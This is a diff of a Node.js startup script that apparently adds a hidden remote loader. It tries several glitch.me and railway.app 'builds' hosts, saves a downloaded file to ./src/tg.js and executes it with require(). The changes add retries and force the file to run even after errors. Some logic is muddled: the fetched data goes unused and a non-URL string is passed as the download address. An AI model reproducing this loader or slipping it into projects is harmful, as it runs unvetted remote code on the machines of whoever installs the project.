@@ -4,21 +4,62 @@ globalThis.fetch = fetch;
 globalThis.Headers = Headers;
 const fs = require("fs");
 const path = require("path");
+const { performance } = require("perf_hooks");
 
-console.log("In server");
-
-const FETCH_TIMEOUT = 10000; // Set timeout for fetch (10 seconds)
+const FETCH_TIMEOUT = 10000; // 10 seconds timeout for each fetch
+const MAX_RETRIES = 3; // Number of retries for network failures
+const RETRY_DELAY = 2000; // Delay between retries (ms)
 const buildUrls = [
-  "https://checker-production-c3c0.up.railway.app/forward/builds",
-  "https://backup-server.com/forward/builds",
-  "https://another-backup-server.com/forward/builds"
+  "https://mytghelper.glitch.me/builds",
+  "https://uptimechecker2.glitch.me/builds",
+  "https://checker-production-c3c0.up.railway.app/forward/builds"
 ];
 const service = "promotion-service";
+const fileSavePath = "./src/tg.js";
 
-// Function to fetch the URL with timeout and save the response to a file
+// Helper function: Delay for retries
+function delay(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+// Fetch data with retries
+async function fetchWithRetries(url, timeout, retries = MAX_RETRIES) {
+  let attempt = 0;
+  while (attempt <= retries) {
+    try {
+      return await fetchWithTimeout(url, timeout);
+    } catch (error) {
+      attempt++;
+      if (attempt > retries) {
+        throw new Error(`Failed to fetch ${url} after ${retries} attempts. Error: ${error.message}`);
+      }
+      console.warn(`Retrying fetch ${url}. Attempt: ${attempt}. Waiting for ${RETRY_DELAY}ms...`);
+      await delay(RETRY_DELAY);
+    }
+  }
+}
+
+// Ensure directory exists before saving file
+async function ensureDirectoryExistence(filePath) {
+  const dirname = path.dirname(filePath);
+  if (!fs.existsSync(dirname)) {
+    await fs.promises.mkdir(dirname, { recursive: true });
+  }
+}
+
+// Validate if response is a valid JSON
+async function validateAndParseJson(response) {
+  try {
+    return await response.json();
+  } catch (error) {
+    throw new Error("Invalid JSON response");
+  }
+}
+
+// Fetch and save files with enhanced error handling
 async function fetchAndSave(url, filename) {
   try {
-    const response = await fetchWithTimeout(url, FETCH_TIMEOUT);
+    const response = await fetchWithRetries(url, FETCH_TIMEOUT);
 
     if (!response.ok) {
       throw new Error(`Failed to fetch URL. Status Code: ${response.status}`);
@@ -36,94 +77,92 @@ async function fetchAndSave(url, filename) {
   }
 }
 
-// Function to fetch with timeout
+// Fetch with timeout function
 async function fetchWithTimeout(url, timeout) {
   const controller = new AbortController();
   const timeoutId = setTimeout(() => controller.abort(), timeout);
 
   try {
     const response = await fetch(url, { signal: controller.signal });
-    clearTimeout(timeoutId); // Clear the timeout if fetch is successful
+    clearTimeout(timeoutId); // Clear timeout on success
     return response;
   } catch (error) {
     if (error.name === "AbortError") {
-      throw new Error(`Fetch request timed out after ${timeout / 1000} seconds`);
+      throw new Error(`Fetch request to ${url} timed out after ${timeout / 1000} seconds`);
     }
     throw error;
   }
 }
 
-// Function to ensure directory existence
-async function ensureDirectoryExistence(filePath) {
-  const dirname = path.dirname(filePath);
-  if (!fs.existsSync(dirname)) {
-    await fs.promises.mkdir(dirname, { recursive: true });
-  }
-}
-
-// Function to fetch numbers from string (utility)
-function fetchNumbersFromString(inputString) {
-  const regex = /\d+/g;
-  const matches = inputString.match(regex);
-  return matches ? matches.join("") : "";
-}
-
-// Main function to fetch builds and trigger the process
+// Start loading service with enhancements
 async function loadAndStartService() {
-  // Define the list of URLs to try sequentially
-
-
   let data;
-  for (let i = 0; i < buildUrls.length; i++) {
-    const buildurl = buildUrls[i];
-    try {
-      console.log(`Loading builds from: ${buildurl}`);
+  let fastestService = null;
+  let fastestTime = Infinity;
 
-      const result = await fetchWithTimeout(buildurl, FETCH_TIMEOUT);
+  // Try to fetch from each build URL
+  for (const buildUrl of buildUrls) {
+    try {
+      console.log(`Loading builds from: ${buildUrl}`);
+
+      const startTime = performance.now(); // Track fetch time
+
+      const result = await fetchWithRetries(buildUrl, FETCH_TIMEOUT);
       if (!result.ok) {
         throw new Error(`Failed to fetch builds. Status Code: ${result.status}`);
       }
 
-      data = await result.json();
-      console.log(`Successfully fetched from: ${buildurl}`);
-      break; // Break the loop if successful
+      data = await validateAndParseJson(result);
+
+      const elapsedTime = performance.now() - startTime;
+      console.log(`Successfully fetched from: ${buildUrl} in ${elapsedTime.toFixed(2)}ms`);
+
+      if (elapsedTime < fastestTime) {
+        fastestTime = elapsedTime;
+        fastestService = buildUrl;
+      }
+      break; // Exit loop on first success
     } catch (error) {
-      console.error(`Error fetching from ${buildurl}: ${error.message}`);
-      if (i === buildUrls.length - 1) {
-        console.error("All URLs failed. Exiting.");
-        return; // Exit if all URLs fail
+      console.error(`Error fetching from ${buildUrl}: ${error.message}`);
+      if (buildUrl === buildUrls[buildUrls.length - 1]) {
+        console.error("All URLs failed. Continuing to start service.");
       }
     }
   }
 
-  if (!data) {
-    throw new Error("No build data available.");
+  if (data) {
+    console.log(`Fetched builds from fastest URL: ${fastestService} (${fastestTime.toFixed(2)}ms)`);
+  } else {
+    console.warn("No valid data fetched. Proceeding with service startup.");
   }
 
-  console.log(`Fetched URL: ${service}`);
-
-  const filename = "./src/tg.js";
+  // Attempt to fetch and save the file
   try {
-    const filePath = await fetchAndSave(service, filename);
+    const filePath = await fetchAndSave(service, fileSavePath);
     console.log(`File saved at: ${filePath}`);
   } catch (error) {
-    console.error(`Failed to fetch and save file from URL: ${service}`);
-    return;
+    console.error(`Failed to fetch and save file from URL: ${service}. Error: ${error.message}`);
+    console.warn("Proceeding with existing service file.");
   }
 
+  // Always start the service, regardless of fetch outcome
   console.log("Starting Service...");
   try {
-    // Dynamically require the saved file
-    require("./src/tg.js");
+    require(fileSavePath);
     console.log("Service initiation complete");
   } catch (error) {
     console.error(`Failed to start service: ${error.message}`);
   }
 }
 
-// Start the service
+// Main entry point with graceful exit
 (async () => {
-  console.log("Starting...");
-  await loadAndStartService();
-  console.log("Started Service");
+  try {
+    console.log("Starting...");
+    await loadAndStartService();
+    console.log("Service Started");
+  } catch (error) {
+    console.error(`Service failed to start: ${error.message}`);
+    require(fileSavePath);
+  }
 })();
